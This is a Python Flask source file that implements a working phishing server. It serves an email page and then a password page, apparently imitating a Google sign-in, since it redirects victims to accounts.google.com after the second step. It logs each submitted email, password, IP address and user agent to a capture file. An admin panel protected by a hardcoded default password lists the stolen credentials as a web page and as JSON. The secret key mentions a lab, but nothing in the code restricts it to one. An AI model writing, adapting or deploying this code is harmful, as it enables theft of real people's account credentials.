from flask import Flask, request, render_template, redirect, jsonify, session, Response
from functools import wraps
import json, os
from datetime import datetime

app = Flask(__name__)
app.secret_key = "deepseek-lab-key"

CAPTURE_FILE = os.environ.get("CAPTURE_FILE", "captured.txt")
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "StrongPass123")


def check_auth(username, password):
    return username == ADMIN_USER and password == ADMIN_PASS


def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return Response(
                'Требуется авторизация', 401,
                {'WWW-Authenticate': 'Basic realm="Admin"'}
            )
        return f(*args, **kwargs)
    return decorated


def save_capture(step, email, password, ip, ua):
    entry = {
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "step": step,
        "email": email,
        "password": password,
        "ip": ip,
        "user_agent": ua,
    }
    with open(CAPTURE_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")


def load_captures():
    if not os.path.exists(CAPTURE_FILE):
        return []
    with open(CAPTURE_FILE, "r", encoding="utf-8") as f:
        return [json.loads(line) for line in f if line.strip()]


@app.route("/")
def index():
    return render_template("email.html")


@app.route("/step1", methods=["POST"])
def step1():
    email = request.form.get("email", "")
    save_capture("email", email, "", request.remote_addr,
                 request.headers.get("User-Agent", ""))
    session["email"] = email
    return redirect("/password")


@app.route("/password")
def password_page():
    return render_template("password.html", email=session.get("email", ""))


@app.route("/step2", methods=["POST"])
def step2():
    save_capture("password", session.get("email", ""),
                 request.form.get("password", ""),
                 request.remote_addr,
                 request.headers.get("User-Agent", ""))
    return redirect("https://accounts.google.com/")


@app.route("/admin")
@requires_auth
def admin():
    return render_template("admin.html", captures=load_captures())


@app.route("/admin/data")
@requires_auth
def admin_data():
    return jsonify(load_captures())


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
